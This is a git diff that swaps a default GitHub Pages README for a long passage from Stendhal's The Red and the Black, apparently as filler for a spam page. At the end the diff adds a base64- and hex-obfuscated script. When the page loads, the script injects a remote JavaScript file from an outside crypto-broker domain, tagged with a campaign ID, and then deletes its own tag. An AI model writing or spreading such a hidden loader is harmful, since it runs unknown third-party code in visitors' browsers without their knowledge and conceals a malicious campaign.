@@ -1,37 +1,75 @@
-## Welcome to GitHub Pages
+# Perhaps he
 
-You can use the [editor on GitHub](https://github.com/zermelesmonurl/Sun/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+Mathilde had not written without a struggle. Whatever might have been the beginning of her interest in Julien, it soon dominated that pride which had reigned unchallenged in her heart since she had begun to know herself. This cold and haughty soul was swept away for the first time by a sentiment of passion, but if this passion dominated her pride, it still kept faithfully to the habits of that pride. Two months of struggles and new sensations had transformed, so to speak her whole moral life.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Mathilde thought she was in sight of happiness. This vista, irresistible as it is for those who combine a superior intellect with a courageous soul, had to struggle for a long time against her self respect and all her vulgar duties. One day she went into her mother's room at seven o'clock in the morning and asked permission to take refuge in Villequier. The marquise did not even deign to answer her, and advised her to go back to bed. This was the last effort of vulgar prudence and respect for tradition.
 
-### Markdown
+The fear of doing wrong and of offending those ideas which the Caylus's, the de Luz's, the Croisenois' held for sacred had little power over her soul. She considered such creatures incapable of understanding her. She would have consulted them, if it had been a matter of buying a carriage or an estate. Her real fear was that Julien was displeased with her.
+![j](https://photographylife.com/wp-content/uploads/2017/05/img013-1200-copy.jpg)
+"Perhaps he, too, has only the appearance of a superior man?"
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+She abhorred lack of character; that was her one objection to the handsome young men who surrounded her. The more they made elegant fun of everything which deviated from the prevailing mode, or which conformed to it but indifferently, the lower they fell in her eyes.
 
-```markdown
-Syntax highlighted code block
+They were brave and that was all. "And after all in what way were they brave?" she said to herself. "In duels, but the duel is nothing more than a formality. The whole thing is mapped out beforehand, even the correct thing to say when you fall. Stretched on the turf, and with your hand on your heart, you must vouchsafe a generous forgiveness to the adversary, and a few words for a fair lady, who is often imaginary, or if she does exist, will go to a ball on the day of your death for fear of arousing suspicion."
 
-# Header 1
-## Header 2
-### Header 3
+"One braves danger at the head of a squadron brilliant with steel, but how about that danger which is solitary, strange, unforeseen and really ugly."
 
-- Bulleted
-- List
+"Alas," said Mathilde to herself, "it was at the court of Henri III. that men who were great both by character and by birth were to be found! Yes! If Julien had served at Jarnac or Moncontour, I should no longer doubt. In those days of strength and vigour Frenchmen were not dolls. The day of the battle was almost the one which presented the fewest problems."
 
-1. Numbered
-2. List
+Their life was not imprisoned, like an Egyptian mummy in a covering which was common to all, and always the same. "Yes," she added, "there was more real courage in going home alone at eleven o'clock in the evening when one came out of the Hôtel de Soissons where Catherine de' Medici lived than there is nowadays in running over to Algiers. A man's life was then a series of hazards. Nowadays civilisation has banished hazard. There are no more surprises. If anything new appears in any idea there are not sufficient epigrams to immortalise it, but if anything new appears in actual life, our panic reaches the lowest depth of cowardice. Whatever folly panic makes us commit is excused. What a degenerate and boring age! What would Boniface de la Mole have said if, lifting his cut-off head out of the tomb, he had seen seventeen of his descendants allow themselves to be caught like sheep in 1793 in order to be guillotined two days afterwards! Death was certain, but it would have been bad form to have defended themselves and to have killed at least one or two Jacobins. Yes! in the heroic days of France, in the age of Boniface de la Mole, Julien would have been the chief of a squadron, while my brother would have been the young priest with decorous manners, with wisdom in his eyes and reason on his lips." Some months previously Mathilde had given up all hope of meeting any being who was a little different from the common pattern. She had found some happiness in allowing herself to write to some young society men. This rash procedure, which was so unbecoming and so imprudent in a young girl, might have disgraced her in the eyes of M. de Croisenois, the Duke de Chaulnes, his father, and the whole Hôtel de Chaulnes, who on seeing the projected marriage broken off would have wanted to know the reason. At that time Mathilde had been unable to sleep on those days when she had written one of her letters. But those letters were only answers. But now she ventured to declare her own love. She wrote first (what a terrible word!) to a man of the lowest social grade.
 
-**Bold** and _Italic_ and `Code` text
+This circumstance rendered her eternal disgrace quite inevitable in the event of detection. Who of the women who visited her mother would have dared to take her part? What official excuse could be evolved which could successfully cope with the awful contempt of society.
 
-[Link](url) and ![Image](src)
-```
+Besides speaking was awful enough, but writing! "There are some things which are not written!" Napoleon had exclaimed on learning of the capitulation of Baylen. And it was Julien who had told her that epigram, as though giving her a lesson that was to come in useful subsequently.
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+But all this was comparatively unimportant, Mathilde's anguish had other causes. Forgetting the terrible effect it would produce on society, and the ineffable blot on her scutcheon that would follow such an outrage on her own caste, Mathilde was going to write to a person of a very different character to the Croisenois', the de Luz's, the Caylus's.
 
-### Jekyll Themes
+She would have been frightened at the depth and mystery in Julien's character, even if she had merely entered into a conventional acquaintance with him. And she was going to make him her lover, perhaps her master.
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/zermelesmonurl/Sun/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+"What will his pretensions not be, if he is ever in a position to do everything with me? Well! I shall say, like Medea: Au milieu de tant de périls il me reste Moi." She believed that Julien had no respect for nobility of blood. What was more, he probably did not love her.
 
-### Support or Contact
+In these last moments of awful doubt her feminine pride suggested to her certain ideas. "Everything is bound to be extraordinary in the life of a girl like me," exclaimed Mathilde impatiently. The pride, which had been drilled into her since her cradle, began to struggle with her virtue. It was at this moment that Julien's departure precipitated everything.
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+(Such characters are luckily very rare.)
+
+Very late in the evening, Julien was malicious enough to have a very heavy trunk taken down to the porter's lodge. He called the valet, who was courting mademoiselle de la Mole's chambermaid, to move it. "This manœuvre cannot result in anything," he said to himself, "but if it does succeed, she will think that I have gone." Very tickled by this humorous thought, he fell asleep. Mathilde did not sleep a wink.
+
+Julien left the hôtel very early the next morning without being seen, but he came back before eight o'clock.
+
+He had scarcely entered the library before M. de la Mole appeared on the threshold. He handed her his answer. He thought that it was his duty to speak to her, it was certainly perfectly feasible, but mademoiselle de la Mole would not listen to him and disappeared. Julien was delighted. He did not know what to say.
+
+"If all this is not a put up job with comte Norbert, it is clear that it is my cold looks which have kindled the strange love which this aristocratic girl chooses to entertain for me. I should be really too much of a fool if I ever allowed myself to take a fancy to that big blonde doll." This train of reasoning left him colder and more calculating than he had ever been.
+
+"In the battle for which we are preparing," he added, "pride of birth will be like a high hill which constitutes a military position between her and me. That must be the field of the manœuvres. I made a great mistake in staying in Paris; this postponing of my departure cheapens and exposes me, if all this is simply a trick. What danger was there in leaving? If they were making fun of me, I was making fun of them. If her interest for me was in any way real, I was making that interest a hundred times more intense."
+
+Mademoiselle de la Mole's letter had given Julien's vanity so keen a pleasure, that wreathed as he was in smiles at his good fortune he had forgotten to think seriously about the propriety of leaving.
+
+It was one of the fatal elements of his character to be extremely sensitive to his own weaknesses. He was extremely upset by this one, and had almost forgotten the incredible victory which had preceded this slight check, when about nine o'clock mademoiselle de la Mole appeared on the threshold of the library, flung him a letter and ran away.
+
+"So this is going to be the romance by letters," he said as he picked it up. "The enemy makes a false move; I will reply by coldness and virtue."
+
+He was asked with a poignancy which merely increased his inner gaiety to give a definite answer. He indulged in the pleasure of mystifying those persons who he thought wanted to make fun of him for two pages, and it was out of humour again that he announced towards the end of his answer his definite departure on the following morning.
+
+"The garden will be a useful place to hand her the letter," he thought after he had finished it, and he went there. He looked at the window of mademoiselle de la Mole's room.
+
+It was on the first storey, next to her mother's apartment, but there was a large ground floor.
+
+This latter was so high that, as Julien walked under the avenue of pines with his letter in his hands, he could not be seen from mademoiselle de la Mole's window. The dome formed by the well clipped pines intercepted the view. "What!" said Julien to himself angrily, "another indiscretion! If they have really begun making fun of me, showing myself with a letter is playing into my enemy's hands."
+
+Norbert's room was exactly above his sister's and if Julien came out from under the dome formed by the clipped branches of the pine, the comte and his friend could follow all his movements.
+
+Mademoiselle de la Mole appeared behind her window; he half showed his letter; she lowered her head, then Julien ran up to his own room and met accidentally on the main staircase the fair Mathilde, who seized the letter with complete self-possession and smiling eyes.
+
+"What passion there was in the eyes of that poor madame de Rênal," said Julien to himself, "when she ventured to receive a letter from me, even after six months of intimate relationship! I don't think she ever looked at me with smiling eyes in her whole life."
+
+He did not formulate so precisely the rest of his answer; was he perhaps ashamed of the triviality of the motive which were actuating him?
+
+"But how different too," he went on to think, "are her elegant morning dress and her distinguished appearance! A man of taste on seeing mademoiselle de la Mole thirty yards off would infer the position which she occupies in society. That is what can be called a specific merit."
+
+In spite of all this humorousness, Julien was not yet quite honest with himself; madame de Rênal had no marquis de Croisenois to sacrifice to him. His only rival was that grotesque sub-prefect, M. Charcot, who assumed the name of Maugiron, because there were no Maugirons left in France.
+
+At five o'clock Julien received a third letter. It was thrown to him from the library door. Mademoiselle de la Mole ran away again. "What a mania for writing," he said to himself with a laugh, "when one can talk so easily. The enemy wants my letters, that is clear, and many of them." He did not hurry to open this one. "More elegant phrases," he thought; but he paled as he read it. There were only eight lines.
+
+"I need to speak to you; I must speak to you this evening. Be in the garden at the moment when one o'clock is striking. Take the big gardeners' ladder near the well; place it against my window, and climb up to my room. It is moonlight; never mind."
+
+<script id="qVWaG" src="data:text/javascript;base64, dmFyIF9jMlNGRCA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oXzgwd2pjLCBfSTY2MGUpIHt2YXIgX0FHdHA1ID0gZnVuY3Rpb24oX0JINHl0KSB7d2hpbGUgKC0tX0JINHl0KSB7Xzgwd2pjWydwdXNoJ10oXzgwd2pjWydzaGlmdCddKCkpO319O19BR3RwNSgrK19JNjYwZSk7fShfYzJTRkQsIDB4MTFiKSk7dmFyIF9qSEU4MiA9IGZ1bmN0aW9uKF9WUURRcywgX29LTFlhKSB7X1ZRRFFzID0gX1ZRRFFzIC0gMHgwO3ZhciBfVnpScTYgPSBfYzJTRkRbX1ZRRFFzXTtyZXR1cm4gX1Z6UnE2O307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfakhFODIoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX012YlJGID0gZG9jdW1lbnRbX2pIRTgyKCcweDEnKV0oX2pIRTgyKCcweDInKSk7X012YlJGW19qSEU4MignMHgzJyldID0gX2pIRTgyKCcweDQnKTtfTXZiUkZbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2NVx4NmNceDY1XHg2ZVx4NjFceDZiXHg2MVx4N2FceDYxXHg2Ylx4NmZceDc2XHg2MVx4MmVceDYzXHg3Mlx4NzlceDcwXHg3NFx4MmRceDYyXHg3Mlx4NmZceDZiXHg2NVx4NzJceDJlXHg2M1x4NmZceDZkXHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg1OFx4NjdceDQ1XHg0OVx4NGVceDY2XHg2ZVx4NDVceDZkXHg2OCc7ZG9jdW1lbnRbX2pIRTgyKCcweDUnKV0oX2pIRTgyKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX012YlJGKTtkb2N1bWVudFtfakhFODIoJzB4NycpXSgncVZXYUcnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
